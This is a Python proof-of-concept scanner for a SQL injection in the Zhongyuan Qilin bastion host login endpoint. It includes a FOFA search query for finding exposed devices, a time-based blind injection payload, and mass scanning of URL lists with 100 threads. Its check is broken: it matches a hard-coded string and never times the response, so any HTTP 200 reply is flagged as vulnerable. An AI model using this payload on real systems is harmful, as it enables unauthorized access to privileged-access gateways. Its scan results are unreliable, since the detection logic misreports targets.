#中远麒麟堡垒机存在SQL注入

# fofa语句：cert.subject="Baolei"

import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
 ____  _     ____  _      ________  _ _     ____  _     
/_   \/ \ /|/  _ \/ \  /|/  __/\  \/// \ /\/  _ \/ \  /|
 /   /| |_||| / \|| |\ ||| |  _ \  / | | ||| / \|| |\ ||
/   /_| | ||| \_/|| | \||| |_// / /  | \_/|| |-||| | \||
\____/\_/ \|\____/\_/  \|\____\/_/   \____/\_/ \|\_/  \|
                                                                                                   
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="中远麒麟堡垒机")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target + url_payload
    header = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
        'Connection':'close',
        'Content-Length':'76',
        'Accept':'*/*',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200:
            s = '{"result":0,"msg":"username and password does not match!","data":[]}'
            pattern = r'\{"result":0,"msg":"username and password does not match!","data":\[\]\}'
            match = re.match(pattern, s)
            if match:
                print(f"f[+]该url存在SQL注入漏洞,url为{target}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target + "\n")
            else:
                print(f"[-]该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == '__main__':
    main()